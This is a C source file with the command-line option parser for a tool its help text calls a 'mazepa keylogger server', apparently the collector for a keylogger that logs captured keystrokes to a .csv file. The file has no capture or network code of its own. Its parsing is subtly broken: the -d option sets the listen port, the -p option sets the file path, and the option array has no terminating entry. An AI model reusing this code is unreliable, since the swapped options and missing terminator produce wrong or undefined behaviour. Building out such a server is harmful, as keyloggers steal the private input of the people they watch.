
#include "server.h"
#include <bits/getopt_core.h>
#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>

const static struct option cli_options[] = {
    {"help", no_argument, 0, 'h'},
    {"listen-port", required_argument, 0, 'p'},
    {"db-path", required_argument, 0, 'd'},
};

static void get_help(const char *bin_name) {
  printf("%s: mazepa keylogger server\n\n", bin_name);
  printf("USAGE:\n");
  printf("\t--listen-port [-p]: specifies server listening port\n");
  // TODO: use sqlite instead? cbf to be honest, but could be a good exercise
  printf("\t--db-path     [-d]: specifies .csv filepath\n");

  printf("\t--help        [-h]: triggers help mode\n");
  printf("\n\nwritten with <3 by djnn -- https://djnn.sh\n");
}

int parse_cli_arguments(server_t *instance, int ac, char **av,
                        __attribute__((unused)) char **envp) {

  int c = 0;
  int opt_idx = 0;
  char const *short_options = "d:p:h";

  while ((c = getopt_long(ac, av, short_options, cli_options, &opt_idx)) !=
         -1) {

    switch (c) {
    case 'h':
      get_help(av[0]);
      _exit(0);

    case 'd':

      instance->options.listen_port = (unsigned short)strtoul(optarg, NULL, 0);
#ifdef DEBUG
      DEBUG_LOG("setting listen port to %d", instance->options.listen_port);
#endif
      break;

    case 'p':

      bzero((void *)instance->options.db_filepath, STRING_BUFFER_SIZE);
      memcpy((void *)instance->options.db_filepath, optarg,
             strnlen(optarg, STRING_BUFFER_SIZE));
#ifdef DEBUG
      DEBUG_LOG("setting .db filepath to: %s", instance->options.db_filepath);
#endif
      break;

    case '?':
      return ERROR;

    default:
      break;
    }
  }

  return SUCCESSFUL;
}
